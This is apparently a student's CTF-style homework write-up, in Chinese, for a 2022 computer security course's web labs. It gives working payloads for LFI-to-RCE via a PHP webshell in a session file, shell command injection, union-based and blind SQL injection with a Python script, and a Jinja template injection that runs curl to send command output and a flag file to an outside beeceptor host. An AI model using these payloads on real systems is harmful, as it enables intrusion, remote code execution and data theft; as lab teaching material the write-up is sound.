# 2022 Computer Security HW9 Writeup - Web

* [HW9 github (Writeup and Payload)](https://github.com/fdff87554/Computer-Security-2022/tree/main/homework/Homework-09)

## Hello from Windows 98 - Lab
* 首先先做頁面的觀察跟嘗試，因為題目有直接給 source code 可以做觀看，因此就觀察一下，可以看到全部共有三個頁面，初始頁面 `/index.php`、接收輸入並且建立 session 的 `say.php` 頁面，還有顯示輸入資料的 `hi.php` 頁面。
* 由於題目跳轉頁面的方式是利用 `page` 這個變數接收檔名去做顯示，因此我們這邊嘗試輸入 `?page=../../../../etc/passwd` 來看看環境是否有 LFI 的漏洞，結果發現可以成功讀取檔案，又因為會建立 session，因此我們可以嘗試利用 seesion file 的 LFI 來做 RCE 的攻擊。
* 首先目標是希望 session file 會記錄到我們希望建立的木馬，因此準備 php 一句話木馬 `<?php system($_GET['cmd']); ?>`，並且利用一開始由 server 給我們的 `Set-Cookie: PHPSESSID=dbf1212bbb92456e2882440743c5914d; path=/` 確定我們檔案的 session_id 是 `dbf1212bbb92456e2882440743c5914d`，準備好 php 木馬 跟有 session file 之後，就利用 `../../../../tmp/sess_dbf1212bbb92456e2882440743c5914d&cmd=ls` 作為我們的 LFI payload 看看能不能列出 files，並如下圖成功取得 shell。
    > 會用 `&` 是因為 url 上面有兩個參數。
    > ![web-lab01-php-oneline-shell](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab01-php-oneline-shell.png)
    > ![web-lab01-php-session-file-LFI](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab01-php-session-file-LFI.png)
    > ![web-lab01-php-session-file-LFI2RCE](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab01-php-session-file-LFI2RCE.png)
* 到這裡就可以直接印出我們的 flag.txt 取得 flag: `FLAG{LFI_t0_rC3_1s_e4Sy!}`
    > ![web-lab01-ans](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab01-ans.png)


## Whois Tool - Lab
* 這題題目的 source code 非常簡單，就是會把我們的輸入 `host` 串接進 `echo 'whois "{$host}" 2>&1;';`，而且有個限制就是字串輸入不能超過 15 個字元，因此我們的目標就是要找出一個可以 bypass 這個限制的 payload。
* 概念很簡單，我們其實不在意 `whois` 的查找，而且我們希望確保我們的 payload 不會被視為 `whois` 的查找，因此我們建構了 payload `"; ls #` 來分別做到，截斷前面的 whois 查找，並且利用 `;` 做到前一個指令結束之後執行 `ls` 並且利用 `#` 註解掉剩下的部分，可以看到我們的 payload 成功執行了 `ls`，並且可以成功看到有 `flag.txt` 的檔案。
    > ![web-lab02-ls](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab02-ls.png)
* 基於上面的概念理論上我們可以直接建構 `"; cat flag.txt #` 這樣的 payload 去印出 flag.txt 來取得 flag，但題目設計的非常人性化，這邊個 payload 剛好卡在大於 15 個字元，為了減少字元的使用，這邊決定利用 `*` 萬用字元來避免長度限制，因為同目錄底下沒有其他 f 開頭的檔案了，因此可以直接利用 `"; cat f* #` 來印出 flag: `FLAG{c0mM4nd_1nj3cT10n_';whoami}`
    > ![web-lab02-ans](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab02-ans.png)
* 那因為我們還知道有其他指令串些的方式如 `&&` 用在前一個指令成功時接著執行的指令，還有 `||` 用在前一個指令失敗時的後一個指令執行的狀況，因此這邊延伸一個 payload 是 `"&& cat f* #`，會是 `&&` 而不是 `||` 的原因是因為 `"` 對 `whois` 指令的截斷，必沒有觸發 `whois` 指令的錯誤 (找不到東西不是一種錯誤，是一種結果)，因此對於我們來說要讓 `cat flag.txt` 被執行到就要利用 `&&` 來達成。
    > ![web-lab02-ans](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab02-ans-more.png)


## Normal Login Panel (Flag 1) - Lab
* 這題只有一個 login page 而且沒有太多的資訊，登入頁面我們開始嘗試 SQL Injection，但因為我們不知道這個頁面會準備怎樣的資訊給我們，因此首先要先確認回顯狀況。
* 這邊提示有給我們有一個 username 是 admin，這邊輸入錯誤的 password 會拿到 `Login faild count: 30` 這個 error message，而其他不存在的 user 則是 `User doesn't exist! Login faild count: xx`。
* 我們嘗試起手的 sql injection 可以看到當輸入 `admin' or 1=1-- #` 看到的不是 `Login faild count: xx` 而是 `User doesn't exist! Login faild count: xx`，因此可以利用 error message 的差異來做到辨識 SQL Injection 的注入狀況。
* 那這邊可以開始利用 `union select` 來猜共有幾個欄位，但這邊改用 `order by` 來猜，概念上是一樣的，在猜到 `admin' order by 5 -- #` 的時候會壞掉就可以知道共有 4 個欄位了。
* 因為現在只有 `Login faild count: xx` 的這個 xx 會把資料回顯在前端，因此現在來確認哪個欄位會把資料顯示在這邊，利用 `admin' union select NULL, NULL, NULL, 'a' -- #` 來確認第四個欄位會把資料回顯在前端。
* 那這個時候要開始猜 DBMS 是哪一種了，理論上會開始猜 table for example `user()` 是 mysql，或者交給我們的 sqlmap 好工具去爆破，那這邊講師有說是 SQLite，因此我們利用 `admin' union SELECT NULL, NULL, NULL, sql FROM sqlite_master WHERE type='table' -- #`，可以看到我們有 `users` 這個 table，裡面分別有 `id`、`username`、`password`、`count`四個欄位。
    > ![web-lab03-list-sql-info](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab03-list-sql-info.png)
* 那我們現在目標是知道 password，因此下 `admin' union SELECT NULL, NULL, NULL, password FROM users -- #` 來從 users 這張表取得 password，可以拿到 flag `FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}`。

## Normal Login Panel (Flag 2) - Lab
* 登入進去之後可以看到 srouce code，是一份 python template 並且會吃 `greet` 這個參數，並且 `return render_template_string(f"Hello {greet}")`，因此我們可以針對 `greet` 這個參數做 template injection。
    > ![web-lab04-source-code](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-source-code.png)
* 先把資料送到 Burp 的 repeater 做資料從送，這邊 encode 可以改成 body encoding 會更好整理重送資料，可以看到不管是把 `greet` 設為 `a` or `{{7*7}}` 會正確回應 `Hello a` or `Hello 49`。
* 因此依照目標是先找到任意一個東西的 class -> `__class__`，因此我們可以利用 `{{[].__class__}}` 來找到 `list` 這個 class，而 `{{[].__class__.__base__}}` 則是 `list` 的 base class，也就是 `object`，有就是回應到所有的 class 的 base 其實都是 object 這邊。
    > ![web-lab04-list-class-base](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-base.png)
* 因此目標是找到可以操作的 system command，因此我們可以利用 `{{[].__class__.__base__.__subclasses__()}}` 來找到所有的 class，因為我們希望操作 `os` 底下的 class，所以找到 `os._wrap_close` 來作為目標，找到之後可以利用 `{{[].__class__.__base__.__subclasses__()[140]}}` 來操作 `os._wrap_close` 這個 class (因為我們再 sublime 中看到他是地 141 個，也就是 list 中 index 的 140 個)。
    > ![web-lab04-list-class-subclasses](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses.png)
    > ![web-lab04-list-class-subclasses-os](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-os.png)
* 從 `__init__` 的 `__global__` 中可以看到 `os.system` (payload: `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__}}`)，因此我們可以利用 `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['system']}}` 來確認 system 能不能用。
    > ![web-lab04-list-class-subclasses-os-ls](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system.png)
* 但因為 python 的 system 不會像 php 一樣回顯，因此用 [beeceptor](https://beeceptor.com/) 來準備一個簡單的 dns 並且用 `curl <dns>` 來送資料出來，顯示 ls 的結果 payload 如下 `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['system']('curl https://crazyfirelee.free.beeceptor.com -d "`ls -al`"')}}`，印出 flag 的 payload 如下 `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['system']('curl https://crazyfirelee.free.beeceptor.com -d "`cat flag.txt`"')}}`: `FLAG{S1_fu_Q1_m0_b4N_zHU_ru}`。
    > ![web-lab04-list-class-subclasses-system-curl](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system-curl.png)
    > ![web-lab04-list-class-subclasses-system-curl-flag](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system-curl-flag.png)

## PasteWeb (Flag 1) - HW
* 這題打開就是一個登入頁面，這邊想看看 source code 發現沒東西可以看，因此直接手動輸入互動一下，可以發現 error message 有兩種，分別是 `Login Failed` 跟 `Bad Hacker!`，觸發情境分別是一般輸入跟 `admin' union select NULL, NULL -- #` 或者其他 sql payload，因此這邊猜測當 injection 有成功的時候 (不確定後端回傳資料狀況，但應該是 return data > 1) 的時候，就會觸發 "Bad Hacker!" 字串，但也可以發現這邊的 return message 並沒有涉及到任何輸入的資料回顯，因此開始利用 Blind SQL Injection 來找出資料庫的資料。
* 這邊我準備了一個 shell 來進行 Binary Search 來查詢資料，我的邏輯如下，首先我需要資料這個 DBMS 底下有哪些 DB，再從這些 DB 中選目標的那個 DB 列出所有的 Tables，並從這些 Tables 中找到所有的欄位，再從所有的欄位中找到所有的資料。
* 這邊的 BinSearch function 如下，為了讓請求更加像真實的請求，我這邊有準備了 chrome 的 headers 來確保請求穩定性。可以看到這邊利用 `"Login Failed"` 作為錯誤的判斷依據，做 BinSearch。
    ```python=
    def BinSearch(target: str, start: int, end: int, step: int, headers: dict, url: str, session: requests.Session()):
        while start < end:
            mid = (start + end) // 2
            data = {
                "username": f"{target} {mid} -- #",
                "password": "password",
                "current_time": str(int(time.time())),
            }
            response = session.post(url, headers=headers, data=data)
            if response.text.find("Login Failed") != -1:
                end = mid
            else:
                start = mid + step
        return start
    ```
* 之後就是依照上面想找的資料邏輯一個一個字元爆破所需要的資料 (包含 flag)，請看 payload.py。最後拿到 flag: `FLAG{B1inD_SqL_IiIiiNj3cT10n}`

## PasteWeb (Flag 2) - HW

## PasteWeb (Flag 3) - HW


---
###### tags: `CyberSec` `Writeup` `2022`

<style>
.navbar-brand::after { content: " × Crazyfire Lee"; }
</style>